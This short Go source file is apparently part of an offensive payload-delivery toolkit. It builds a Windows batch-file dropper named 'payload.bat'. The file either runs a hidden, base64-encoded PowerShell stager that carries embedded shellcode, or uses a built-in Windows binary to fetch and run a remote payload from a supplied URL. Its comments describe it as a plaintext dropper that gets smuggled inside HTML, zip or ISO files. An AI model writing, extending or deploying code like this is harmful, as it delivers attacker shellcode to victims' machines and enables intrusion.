// bat.go — emit a Windows batch file (.bat) run via double-click or
// `cmd /c payload.bat`. Inline mode runs the embedded-shellcode powershell
// stager (`powershell -NoP -NoLogo -w hidden -Enc <stager>`); remote mode runs
// the launcher's LOLBin fetch primitive for --url. A .bat is the simplest
// plaintext dropper, a useful standalone delivery, and the payload smuggled by
// -f html (see zip/html/iso for combine formats that package a .bat).
package delivery

type batEmitter struct{}

func (batEmitter) Name() string { return "bat" }
func (batEmitter) Ext() string  { return "bat" }

func (batEmitter) Emit(s *Spec) ([]Artifact, error) {
	var line string
	switch {
	case s.Remote():
		line = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		line = "powershell -NoP -NoLogo -w hidden -EncodedCommand " + ps1InlineEnc(s.Shellcode)
	default:
		return nil, errPayloadRequired("bat")
	}
	body := "@echo off\r\n" + line + "\r\n"
	return []Artifact{writeFile("payload.bat", []byte(body))}, nil
}
